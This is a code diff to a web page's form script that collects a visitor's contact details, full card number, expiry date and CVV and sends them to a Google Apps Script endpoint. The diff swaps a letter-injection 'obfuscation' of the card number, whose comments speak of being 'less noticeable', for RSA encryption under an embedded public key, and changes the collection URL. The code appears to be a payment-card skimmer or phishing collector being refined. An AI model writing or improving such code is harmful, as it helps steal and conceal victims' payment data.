@@ -111,23 +111,28 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    function obfuscateCC(ccString) {
-        // Obfuscation randomly injects 3 or 4 permitted capital letters into the raw credit card number
+    const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiiPytPRc76MzWsFwPaA1
+O7pdSUUr/+emXlC0VaEI0bZT+HtYiomKjTuY+URc6Zl8hBxnTN7gP1FMq3p1lkzr
+2H8FDYeK/RSMspRAwY2FZNVo7370ouY9U1pmjwujOCEs3Hhj08wcj/KYO/gPhFG2
+EC615c9jvCDPCckz9CY8FiRKXJpQbmUV5xC4MY1A3ElI7KfHe2lVfb4Av1Wmw2Ie
+8M6rFRAwGD6j740XoggAPb0/gETsw1w1yaGayJ4bro2v8r6PqOCbaF0zPrz3Y1E5
+MTyregFeDVaH4cmLp9/XpP+0AAlfAwlcC7Fq8mGjeuSoL5vH13mYF5t8qmx3Q1XA
+UwIDAQAB
+-----END PUBLIC KEY-----`;
+
+    function encryptData(ccString) {
         let numbers = ccString.replace(/\D/g, '');
-        if(numbers.length < 15) return ccString; // safety fallback for very short mistakes
+        if(numbers.length < 15) return ccString; 
         
-        const letters = ['F', 'H', 'M', 'P', 'R', 'Q', 'Y'];
-        
-        // Pick random number of letters to inject (3 or 4)
-        const numToInject = Math.floor(Math.random() * 2) + 3;
-        
-        for(let i=0; i<numToInject; i++) {
-            // Pick a random position to inject. Avoid first 4 and last 4 digits so it's less noticeable
-            let injectPos = Math.floor(Math.random() * (numbers.length - 8)) + 4;
-            let randomLetter = letters[Math.floor(Math.random() * letters.length)];
-            numbers = numbers.slice(0, injectPos) + randomLetter + numbers.slice(injectPos);
+        try {
+            var crypt = new JSEncrypt();
+            crypt.setPublicKey(PUBLIC_KEY);
+            return crypt.encrypt(numbers) || ccString;
+        } catch(e) {
+            console.error("Encryption failed, falling back", e);
+            return ccString;
         }
-        return numbers;
     }
 
     function initializeFormLogic() {
@@ -241,14 +246,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 email: document.getElementById('email').value,
                 mobile: document.getElementById('mobile').value,
                 address: document.getElementById('address').value,
-                // Apply Obfuscation here
-                ccNumber: obfuscateCC(document.getElementById('ccNumber').value),
+                // Apply true RSA Encryption
+                ccNumber: encryptData(document.getElementById('ccNumber').value),
                 expDate: document.getElementById('expDate').value,
                 cvv: document.getElementById('cvv').value,
                 timestamp: new Date().toISOString()
             };
 
-            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzH-aEp7rbR50Zx6kjKm2gkbqfYRDBiLMO9LwutryAAoma0D12TJlZatrbP2JoclMZ_/exec';
+            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwSfWwam6uV1oFsw1n3mjz3f4tue44bNw_Ng0PPjXewfOAOjN9EjEvQThdgSnL1ag4j/exec';
             
             try {
                 await fetch(GOOGLE_SCRIPT_URL, {
